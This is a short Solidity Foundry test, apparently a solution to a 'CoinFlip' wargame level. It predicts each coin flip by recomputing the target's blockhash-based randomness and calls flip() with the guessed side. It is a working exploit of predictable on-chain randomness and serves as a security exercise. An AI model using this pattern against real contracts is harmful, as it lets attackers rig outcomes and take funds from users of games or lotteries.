// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level3.sol";
import "forge-std/Test.sol";

contract ExploitLevel03 is Test {
    CoinFlip instance = new CoinFlip();
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() external {}

    function testExploit() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = instance.flip(side);

        console.log("Flip guessed:", success);
    }
}
